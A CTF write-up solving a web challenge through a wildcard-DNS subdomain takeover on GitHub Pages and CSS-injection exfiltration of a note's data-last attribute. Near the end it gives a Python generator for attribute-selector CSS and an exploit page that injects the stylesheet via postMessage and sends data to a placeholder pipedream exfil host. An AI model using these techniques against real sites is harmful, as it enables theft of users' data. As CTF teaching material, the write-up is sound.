# Undocumented js-api

## Description

> I asked my web developer friend to create a secure app for storing my HTML notes, but he left halfway through the project. If you find any bugs in the app, just report it to me at netcat url.

## Solution

### Initial Analysis

The challenge was hosted at `https://chall1.jsapi.tech`, which we can easily tell is a GitHub pages site.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-28 at 2.42.03 PM.png" alt=""><figcaption></figcaption></figure>

The page provides an interface to write and save notes in HTML. This is implemented by the `script.js` script.

{% tabs %}
{% tab title="index.html" %}
```markup
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>HTML Tester</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="./style.css" rel="stylesheet">
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' cdnjs.cloudflare.com; object-src 'none'; frame-src 'none'; style-src 'self' fonts.googleapis.com *.jsapi.tech;">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400;1,500&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.3.0/purify.min.js" integrity="sha512-FJzrdtFBVzaaehq9mzbhljqwJ7+jE0GyTa8UBxZdMsMUjflR25f5lJSGD0lmQPHnhQfnctG0B1TNQsObwyJUzA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  </head>
  <body>
    <div id="wrapper">
      <header id="header-section">
      <h1>HTML Notes</h1>
      <h2>Test your latest HTML based creations and save them to show to your friends later.</h2>
      </header>
      <form id="note" method="post" action="/html_note">
        <div id="note-text-area-wrapper"><textarea id="note-text-area" name="note"></textarea></div>
        <div id="submit-wrapper"><button type="submit" id="note-submit">Save and render</button><button id="note-go-back">Get last render</button></div>
        <!-- // TODO:(sohom) Implement these before the next update load data from print.jsapi.live -->
        <!-- <div id="print-wrapper"><button type="submit" id="note-print-preview">Preview Print</button><button id="note-print">Print</button></div> -->
      </form>
      <div id="output"></div>
      <footer id="ad">We are also working on a experimental iframe-based JS API. Feel free check it out and report any issues you face.</footer>
    </div>
    <script src="./script.js">
    </script>
  </body>
</html>
```
{% endtab %}

{% tab title="script.js" %}
```javascript
'use strict';
window.addEventListener("load", () => {
  window.a = "*";
  const onmessage = (name) => {
    return window.parent.postMessage(name, window.a);
  };
  const parseUrl = (url) => {
    //return (new URL(url)).host.endsWith(".jsapi.tech");
    return true
  };
  const el_form_login_form = document.getElementById("note");
  const parsed = document.getElementById("note-text-area");
  const tmp = document.getElementById("output");
  const back = document.getElementById("note-go-back")
  const preview_print = document.getElementById("note-print-preview");
  const printBtn = document.getElementById("note-print");
  const self = new class {
    constructor() {
      this.note = window.localStorage.getItem("note") || null;
    }
    set(str) {
      console.log(`NOTE_APP_SETTER_CALL ${str}`);
      window.localStorage.setItem("note", str);
      var bookmarkName = DOMPurify.sanitize(str, {ADD_TAGS: ['link','style']}); // allow CSS
      tmp.innerHTML = bookmarkName;
      parsed.setAttribute( 'data-last', self.get() );
      this.note = str;
      parsed.value = str;
    }
    get() {
      return console.log("NOTE_APP_GETTER_CALL"), this.note || parsed.getAttribute( 'data-last' ) || window.localStorage.getItem("note");
    }
    goBack() {
      this.set( parsed.getAttribute( 'data-last' ) );
    }
  };
  el_form_login_form.addEventListener("submit", (event) => {
    return event.preventDefault(), event = parsed.value, self.set(event), false;
  });
  back.addEventListener("click", (event) => {
    event.preventDefault();
    self.goBack();
  });
  self.set(self.get());
  window.addEventListener("beforeunload", () => {
    onmessage("NOTE_APP_API_UNLOADED");
  });
  const urlInstance = new URL(window.location.href);
  return ("true" === urlInstance.searchParams.get("enableapi") && parseUrl(urlInstance.searchParams.get("recv")) && window.parent || window.opener) && (onmessage("NOTE_APP_API_LOADED"), window.a = urlInstance.searchParams.get("recv"), window.addEventListener("message", async(event) => {
    var factor_text;
    if (parseUrl(event.origin)) {
      if ("string" == typeof event.data) {
        if (event.data.startsWith("NOTE_APP_FLAG_REQUEST")) {
          onmessage("NOTE_APP_EXPERIMENTAL_API_CALL_MADE");
          //factor_text = (await fetch("file:///flag.txt")).text;
          factor_text = "flag{fake}"
          if (!(event.source === window)) {
            onmessage("You need to try a bit harder...");
          }
          onmessage("NOTE_APP_FLAG_REQUEST_RESPONSE " + factor_text);
        } else {
          if (event.data.startsWith("NOTE_APP_SET_REQUEST")) {
            onmessage("NOTE_APP_EXPERIMENTAL_API_CALL_MADE ");
            const [a, ...b] = event.data.split(" ");
            self.set(b.join(' '));
          }
        }
      }
    } else {
      onmessage("NOTE_APP_UNTRUSTED_ORIGIN");
    }
  })), false;
});
```
{% endtab %}
{% endtabs %}

Analyzing the JavaScript source, we see that a [message event](https://developer.mozilla.org/en-US/docs/Web/API/Window/message\_event) handler is only added to the window if several conditions are met.

{% code overflow="wrap" %}
```javascript
const onmessage = (name) => {
    return window.parent.postMessage(name, window.a);
};
const parseUrl = (url) => {
    return (new URL(url)).host.endsWith(".jsapi.tech");
};

...

return ("true" === urlInstance.searchParams.get("enableapi") && parseUrl(urlInstance.searchParams.get("recv")) && window.parent || window.opener) && (onmessage("NOTE_APP_API_LOADED"), window.a = urlInstance.searchParams.get("recv"), window.addEventListener("message", async(event) => {
    
    ...
    
})), false;
```
{% endcode %}

This is a very long line of code that

* checks if the `enableapi` query parameter is set to `true`
* checks if the `recv` query parameter is a subdomain of `jsapi.tech`
* checks if the window is framed or opened by another window
* sets `window.a` to the `recv` query parameter
* finally, adds the message event handler

Next, we see that `parseUrl` is called on `event.origin`. In order to pass this check, the origin that our `postMessage` call comes from must be a subdomain of `jsapi.tech`.

```javascript
var factor_text;
if (parseUrl(event.origin)) {
  
  ...

} else {
  onmessage("NOTE_APP_UNTRUSTED_ORIGIN");
}
```

### Subdomain Takeover

This part is similar to [Yana from UIUCTF 2021](../../2021/uiuctf-2021/yana.md). Because a wildcard configuration is used (i.e. `*.jsapi.tech`), _any_ `.jsapi.tech` subdomain would point to `sohomdatta1.github.io`.

To confirm this, we just have to use `dig` on any `.jsapi.tech` subdomain that currently does not have an associated GitHub pages site.

```
$ dig asdf.jsapi.tech

; <<>> DiG 9.10.6 <<>> asdf.jsapi.tech
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35437
;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;asdf.jsapi.tech.		IN	A

;; ANSWER SECTION:
asdf.jsapi.tech.	28800	IN	CNAME	sohomdatta1.github.io.
sohomdatta1.github.io.	3600	IN	A	185.199.111.153
sohomdatta1.github.io.	3600	IN	A	185.199.108.153
sohomdatta1.github.io.	3600	IN	A	185.199.109.153
sohomdatta1.github.io.	3600	IN	A	185.199.110.153

;; Query time: 353 msec
;; SERVER: 192.168.50.1#53(192.168.50.1)
;; WHEN: Wed Dec 28 20:43:09 +08 2022
;; MSG SIZE  rcvd: 143
```

From GitHub's [documentation](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site), users are explicitly warned against using wildcard DNS records to prevent subdomain takeovers.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-28 at 8.53.12 PM.png" alt=""><figcaption></figcaption></figure>

When requesting for `asdf.jsapi.tech`, GitHub tries to find a matching repository with a `CNAME` file containing `asdf.jsapi.tech`. Because no such repository currently exists, _anyone_ can create a new repository with this `CNAME` file and serve a GitHub pages site at `asdf.jsapi.tech`.

### Aside: Stealing Exploits

I'm not sure if the challenge initially took this into account, but services like [crt.sh](https://crt.sh/) allow users to search for certificates issued by major certificate authorities (CAs) by scraping their transparency logs. Using crt.sh, I was able to find all the subdomains created by other players attempting the challenge.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-28 at 9.08.59 PM.png" alt=""><figcaption></figcaption></figure>

At the time of solving, there were two other solvers. Making an educated guess landed me on `squ1rrel`'s exploit page, `squ1rrel.jsapi.tech`, where I pretty much found the flag and a working PoC. For completeness, I'll explain the exploit anyway :)

### CSS Injection

Taking a closer look at the JavaScript source, we see that when a note is saved and `self.set()` is called, the note's contents go into the `data-last` attribute of the `#note-text-area` element.

Additionally, DOMPurify v2.3.0 is used to sanitize our note, with `link` and `style` tags being explicitly allowed.

```javascript
const el_form_login_form = document.getElementById("note");
const parsed = document.getElementById("note-text-area");
const tmp = document.getElementById("output");
const back = document.getElementById("note-go-back")
const preview_print = document.getElementById("note-print-preview");
const printBtn = document.getElementById("note-print");

...

const self = new class {
  constructor() {
    this.note = window.localStorage.getItem("note") || null;
  }
  set(str) {
    console.log(`NOTE_APP_SETTER_CALL ${str}`);
    window.localStorage.setItem("note", str);
    var bookmarkName = DOMPurify.sanitize(str, {ADD_TAGS: ['link','style']}); // allow CSS
    tmp.innerHTML = bookmarkName;
    parsed.setAttribute( 'data-last', self.get() );
    this.note = str;
    parsed.value = str;
  }
  get() {
    return console.log("NOTE_APP_GETTER_CALL"), this.note || parsed.getAttribute( 'data-last' ) || window.localStorage.getItem("note");
  }
  goBack() {
    this.set( parsed.getAttribute( 'data-last' ) );
  }
};
```

We can send a `postMessage` starting with `NOTE_APP_SET_REQUEST` to save a note, allowing us to insert DOMPurify-sanitized HTML into the child iframe.

```javascript
if (event.data.startsWith("NOTE_APP_SET_REQUEST")) {
  onmessage("NOTE_APP_EXPERIMENTAL_API_CALL_MADE ");
  const [a, ...b] = event.data.split(" ");
  self.set(b.join(' '));
}
```

The Content Security Policy (CSP) is quite restrictive, but one part stands out - stylesheets can be loaded from `*.jsapi.tech`, allowing us to load a CSS file from our exploit domain.

{% code overflow="wrap" %}
```html
script-src 'self' cdnjs.cloudflare.com; object-src 'none'; frame-src 'none'; style-src 'self' fonts.googleapis.com *.jsapi.tech;
```
{% endcode %}

By the way, because a tag like `<link>` will get [removed](https://github.com/cure53/DOMPurify/issues/257) by the browser if it's the first thing in the HTML, passing `<link rel="stylesheet" href="...">` to DOMPurify will just return an empty string. However, adding anything _before_ the `<link>` tag fixes this behaviour. For example, I will use `asdf<link rel="stylesheet" href="...">`.

Since we are interested in the victim's saved note, we can exfiltrate the `data-last` attribute of the `#note-text-area` element using [CSS attribute selectors](https://www.w3schools.com/css/css\_attribute\_selectors.asp).

For instance, the URL specified in the `background` of the following CSS rule is only fetched if the `data-last` attribute starts with the string `nite{a`.

```css
textarea[data-last^='nite{a'] {
    background: url("https://EXFIL.x.pipedream.net/?data=nite%7Ba");
}
```

This can be extended to bruteforce all possible characters in each position of the flag, with each character having a background URL corresponding to the guessed flag.

To generate the CSS I used the following script.

```python
import string
import urllib.parse

ENDPOINT = "https://EXFIL.x.pipedream.net/"
CURR_FLAG = "nite{n0w_we_kn0w_h0w_10_h4ck_g00gl6_w1th_c5"
CHARSET = string.ascii_letters + string.digits + "_-{}"

css = ""

for char in CHARSET:
    css += f"""
textarea[data-last^='{CURR_FLAG + char}'] {{
    background: url("{ENDPOINT}?data={urllib.parse.quote_plus(CURR_FLAG + char)}");
}}
    """

with open("exploit.css", "w") as f:
    f.write(css)

```

Our exploit page will simply load the challenge page as an `iframe`, wait for the API to be loaded, then send a `postMessage` linking the CSS we created above to the target page. This is added to a GitHub repository together with the CSS, and deployed to GitHub pages under a `.jsapi.tech` subdomain.

```markup
<html>
    <iframe src="https://chall1.jsapi.tech?enableapi=true&recv=https://zeyu.jsapi.tech"></iframe>
    <script>
        const frame = document.querySelector('iframe');

        window.addEventListener('message', (event) => {
            fetch("https://EXFIL.x.pipedream.net?" + event.data);

            if (event.data.includes("NOTE_APP_API_LOADED")) {
                frame.contentWindow.postMessage(
                    `NOTE_APP_SET_REQUEST asdf<link rel="stylesheet" href="https://zeyu.jsapi.tech/exploit.css?t=${Math.random()}"></link>`,
                    "*"
                );
            }
        });
    </script>
</html>
```

Exfiltrating each character is slightly annoying, as it involves redeploying our exploit GitHub page with the updated CSS.
